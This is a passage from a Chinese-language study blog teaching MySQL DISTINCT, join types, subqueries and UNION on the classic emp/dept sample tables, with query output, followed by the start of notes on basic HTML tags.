|<br>+-----------+<br></code></pre></td></tr></table></figure><p>distinct只能出现在所有字段的最前方，如果后面有多个字段，则联合去重：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| SALESMAN  |     30 |<br>| CLERK     |     20 |<br>| CLERK     |     30 |<br>| ANALYST   |     20 |<br>| CLERK     |     10 |<br>+-----------+--------+<br>select distinct job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| CLERK     |     30 |<br>| CLERK     |     10 |<br>+-----------+--------+<br></code></pre></td></tr></table></figure><p><strong>连接查询：</strong></p><p>笛卡尔积现象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp;#单独查emp表的ename字段<br>+--------+<br>| ename  |<br>+--------+<br>| SMITH  |<br>| ALLEN  |<br>| WARD   |<br>| JONES  |<br>| MARTIN |<br>| BLAKE  |<br>| CLARK  |<br>| SCOTT  |<br>| KING   |<br>| TURNER |<br>| ADAMS  |<br>| JAMES  |<br>| FORD   |<br>| MILLER |<br>+--------+<br>select dname from dept;#单独查dept表的dname字段<br>+------------+<br>| dname      |<br>+------------+<br>| ACCOUNTING |<br>| RESEARCH   |<br>| SALES      |<br>| OPERATIONS |<br>+------------+<br>select ename,dname from emp,dept;#对两张表进行连接查询，没有任何限制的时候，查询结果条数是两个表条数的乘积<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | ACCOUNTING |<br>| SMITH  | RESEARCH   |<br>| SMITH  | SALES      |<br>| SMITH  | OPERATIONS |<br>| ALLEN  | ACCOUNTING |<br>| ALLEN  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| ALLEN  | OPERATIONS |<br>| WARD   | ACCOUNTING |<br>| WARD   | RESEARCH   |<br>| WARD   | SALES      |<br>| WARD   | OPERATIONS |<br>| JONES  | ACCOUNTING |<br>| JONES  | RESEARCH   |<br>| JONES  | SALES      |<br>| JONES  | OPERATIONS |<br>| MARTIN | ACCOUNTING |<br>| MARTIN | RESEARCH   |<br>| MARTIN | SALES      |<br>| MARTIN | OPERATIONS |<br>| BLAKE  | ACCOUNTING |<br>| BLAKE  | RESEARCH   |<br>| BLAKE  | SALES      |<br>| BLAKE  | OPERATIONS |<br>| CLARK  | ACCOUNTING |<br>| CLARK  | RESEARCH   |<br>| CLARK  | SALES      |<br>| CLARK  | OPERATIONS |<br>| SCOTT  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| SCOTT  | SALES      |<br>| SCOTT  | OPERATIONS |<br>| KING   | ACCOUNTING |<br>| KING   | RESEARCH   |<br>| KING   | SALES      |<br>| KING   | OPERATIONS |<br>| TURNER | ACCOUNTING |<br>| TURNER | RESEARCH   |<br>| TURNER | SALES      |<br>| TURNER | OPERATIONS |<br>| ADAMS  | ACCOUNTING |<br>| ADAMS  | RESEARCH   |<br>| ADAMS  | SALES      |<br>| ADAMS  | OPERATIONS |<br>| JAMES  | ACCOUNTING |<br>| JAMES  | RESEARCH   |<br>| JAMES  | SALES      |<br>| JAMES  | OPERATIONS |<br>| FORD   | ACCOUNTING |<br>| FORD   | RESEARCH   |<br>| FORD   | SALES      |<br>| FORD   | OPERATIONS |<br>| MILLER | ACCOUNTING |<br>| MILLER | RESEARCH   |<br>| MILLER | SALES      |<br>| MILLER | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p>加限制条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select emp.ename,dept.dname from emp,dept where emp.deptno = dept.deptno order by dname;#只有emp中的deptno和dept中的deptno相等时<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#最终查询结果减少了，但是匹配次数没减少，还是4*14=56条<br>#&#x27;select emp.ename,dept.dname from&#x27;部分如果换成&#x27;select ename,dname from&#x27;效率降低，因为虽然dept表中没有ename字段，但是MySQL还是会去找，emp和dname同理，而且逻辑上不够严谨<br>select e.ename,d.dname from emp as e,dept as d where e.deptno = d.deptno order by dname;<br>#给表起别名很重要，提高效率<br></code></pre></td></tr></table></figure><ul><li>内连接<ul><li>等值连接</li><li>非等值连接</li><li>自连接</li></ul></li><li>外连接<ul><li>左外连接(左连接)</li><li>右外连接(右连接)</li></ul></li></ul><p>内连接——等值连接</p><p>上述笛卡尔积现象SQL语句是SQL92语法，SQL99语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno order by dname;<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#实现了外连接与后续where语句的分离，结构更清晰<br>#SQL99语法：<br>SELECT<br>...<br>FROM<br>A<br>JOIN #其实join前面省略了个inner，代表内连接，可省，但是保留可读性更好<br>B<br>ON<br>A和B的连接条件 #如果是等量关系就称为等值连接<br>WHERE<br>筛选条件<br></code></pre></td></tr></table></figure><p>内连接——非等值连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级<br>select * from salgrade;#先看下薪资表<br>+-------+-------+-------+<br>| GRADE | LOSAL | HISAL |<br>+-------+-------+-------+<br>|     1 |   700 |  1200 |<br>|     2 |  1201 |  1400 |<br>|     3 |  1401 |  2000 |<br>|     4 |  2001 |  3000 |<br>|     5 |  3001 |  9999 |<br>+-------+-------+-------+<br>select e.ename,e.sal,s.grade from emp as e join salgrade as s on e.sal between s.losal and s.hisal;<br>+--------+---------+-------+<br>| ename  | sal     | grade |<br>+--------+---------+-------+<br>| SMITH  |  800.00 |     1 |<br>| ALLEN  | 1600.00 |     3 |<br>| WARD   | 1250.00 |     2 |<br>| JONES  | 2975.00 |     4 |<br>| MARTIN | 1250.00 |     2 |<br>| BLAKE  | 2850.00 |     4 |<br>| CLARK  | 2450.00 |     4 |<br>| SCOTT  | 3000.00 |     4 |<br>| KING   | 5000.00 |     5 |<br>| TURNER | 1500.00 |     3 |<br>| ADAMS  | 1100.00 |     1 |<br>| JAMES  |  950.00 |     1 |<br>| FORD   | 3000.00 |     4 |<br>| MILLER | 1300.00 |     2 |<br>+--------+---------+-------+<br></code></pre></td></tr></table></figure><p>内连接——自连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工的上级领导、要求显示员工名和对应的领导名<br>select empno,ename,mgr from emp;<br>+-------+--------+------+<br>| empno | ename  | mgr  |<br>+-------+--------+------+<br>|  7369 | SMITH  | 7902 |<br>|  7499 | ALLEN  | 7698 |<br>|  7521 | WARD   | 7698 |<br>|  7566 | JONES  | 7839 |<br>|  7654 | MARTIN | 7698 |<br>|  7698 | BLAKE  | 7839 |<br>|  7782 | CLARK  | 7839 |<br>|  7788 | SCOTT  | 7566 |<br>|  7839 | KING   | NULL |<br>|  7844 | TURNER | 7698 |<br>|  7876 | ADAMS  | 7788 |<br>|  7900 | JAMES  | 7698 |<br>|  7902 | FORD   | 7566 |<br>|  7934 | MILLER | 7782 |<br>+-------+--------+------+<br>select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a join emp as b on a.mgr=b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br>#自连接的技巧：一张表看做两张表，员工的领导编号等于领导的员工编号<br>#KING没有上级<br></code></pre></td></tr></table></figure><p>外连接：</p><p>查询员工表可以发现员工表中有10、20、30部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from emp;<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br></code></pre></td></tr></table></figure><p>查询部门表发现除了10&#x2F;20&#x2F;30部门还有40部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from dept;<br>+--------+------------+----------+<br>| DEPTNO | DNAME      | LOC      |<br>+--------+------------+----------+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+--------+------------+----------+<br></code></pre></td></tr></table></figure><p>如果希望将除了员工表里有的部门输出外，同时输出员工表中没有的部门，就要用到外连接了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e right join dept d on e.deptno = d.deptno;#right表示将join关键字右边的这张表看做主表，主要是为了将这张表的数据全部查询出来，捎带着关联查询左边的表<br>#同内连接一样，join前面有个可省可不省的outer<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br>#除了14个员工对应的部门外，还有一个匹配不上的OPERATIONS部门也显示出来了，对应的员工为空<br></code></pre></td></tr></table></figure><p>举一反三一下很容易得出左连接的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from dept d left join emp e on e.deptno = d.deptno;#记得把join两侧表名换位置<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p><strong>外连接查询结果条数大于等于内连接</strong></p><p>同样是上面员工领导的问题，使用外连接，可将显示所有员工的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a left join emp as b on a.mgr = b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| KING   | NULL  |#KING显示<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br></code></pre></td></tr></table></figure><p><strong>总结：内连接取交集，外连接取并集</strong></p><p>多张表连接：</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>...<br>FROM<br>A<br>JOIN<br>B<br>ON<br>f(A,B)<br>JOIN<br>C<br>ON<br>g(A,C)<br>JOIN<br>D<br>ON<br>h(A,B)<br>#内连接外连接可以混合<br></code></pre></td></tr></table></figure><p><strong>子查询：</strong></p><p>select语句的嵌套</p><p>where中的子查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#这句语句是错误的，shiyong max()前未分组<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);<br>+--------+---------+<br>| ename  | sal     |<br>+--------+---------+<br>| ALLEN  | 1600.00 |<br>| WARD   | 1250.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 1250.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p>from中的子查询：</p><p>注：from后面的子查询可以将子查询的查询结果当做一张临时表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:找出每个岗位的平均工资的薪资等级<br>#第一步：找出每个岗位的平均工资（按岗位分组）<br>select job,avg(sal) from emp group by job;<br>+-----------+-------------+<br>| job       | avg(sal)    |<br>+-----------+-------------+<br>| ANALYST   | 3000.000000 |<br>| CLERK     | 1037.500000 |<br>| MANAGER   | 2758.333333 |<br>| PRESIDENT | 5000.000000 |<br>| SALESMAN  | 1400.000000 |<br>+-----------+-------------+#现在就将左表看做是一张临时表<br>#第二步：将以上查询结果当做一张真实存在的表t<br>select * from salgrade;#查薪资等级<br>+-------+-------+-------+<br>| GRADE | LOSAL | HISAL |<br>+-------+-------+-------+<br>|     1 |   700 |  1200 |<br>|     2 |  1201 |  1400 |<br>|     3 |  1401 |  2000 |<br>|     4 |  2001 |  3000 |<br>|     5 |  3001 |  9999 |<br>+-------+-------+-------+#起别名s<br>#将t表和s表进行表连接，连接条件是t.avg(sal) between s.losal and s.hisal<br>select t.job,s.grade from (select job,avg(sal) from emp group by job) as t join salgrade as s on t.avg(sal) between s.losal and s.hisal;<br>#执行以上命令出现报错：<br>#ERROR 1630 (42000): FUNCTION t.avg does not exist. Check the &#x27;Function Name Parsing and Resolution&#x27; section in the Reference Manual<br>#原因是on后面的t.avg(sal)被认为是分组函数，外层select未进行分组<br>#修改方法：起别名<br>select t.job,s.grade from (select job,avg(sal) as avg from emp group by job) as t join salgrade as s on t.avg between s.losal and s.hisal;<br>+-----------+-------+<br>| job       | grade |<br>+-----------+-------+<br>| ANALYST   |     4 |<br>| CLERK     |     1 |<br>| MANAGER   |     4 |<br>| PRESIDENT |     5 |<br>| SALESMAN  |     2 |<br>+-----------+-------+<br></code></pre></td></tr></table></figure><p><strong>联合查询(UNION)：</strong></p><p>合并查询结果集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,job from emp where job = &#x27;MANAGER&#x27;;<br>+-------+---------+<br>| ename | job     |<br>+-------+---------+<br>| JONES | MANAGER |<br>| BLAKE | MANAGER |<br>| CLARK | MANAGER |<br>+-------+---------+<br>select ename,job from emp where job = &#x27;SALESMAN&#x27;;<br>+--------+----------+<br>| ename  | job      |<br>+--------+----------+<br>| ALLEN  | SALESMAN |<br>| WARD   | SALESMAN |<br>| MARTIN | SALESMAN |<br>| TURNER | SALESMAN |<br>+--------+----------+<br>select ename,job from emp where job = &#x27;MANAGER&#x27; union select ename,job from emp where job = &#x27;SALESMAN&#x27;;<br>+--------+----------+<br>| ename  | job      |<br>+--------+----------+<br>| JONES  | MANAGER  |<br>| BLAKE  | MANAGER  |<br>| CLARK  | MANAGER  |<br>| ALLEN  | SALESMAN |<br>| WARD   | SALESMAN |<br>| MARTIN | SALESMAN |<br>| TURNER | SALESMAN |<br>+--------+----------+<br></code></pre></td></tr></table></figure><p><strong>注意：union联合查询的两个结果要求列的数目以及数据类型相同</strong></p><p><strong>limit：</strong></p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><p><code>&lt;!DOCTYPE html&gt;</code>是H5的声明位于文档的最前面，处于标签之前。他是网页必备的组成部分，避免浏览器的怪异模式。</p><p><code>meta</code>标签用于描述一个HTML网页文档的属性，关键词等，eg：<code>&lt;meta charset=&#39;UTF-8&#39;&gt;</code>，是单标签</p><p>生成<code>&lt;h1&gt;</code>到<code>&lt;h6&gt;</code>快捷键：<code>h$*6</code></p><p>align属性，调整标题摆放位置</p><p><code>&lt;h1 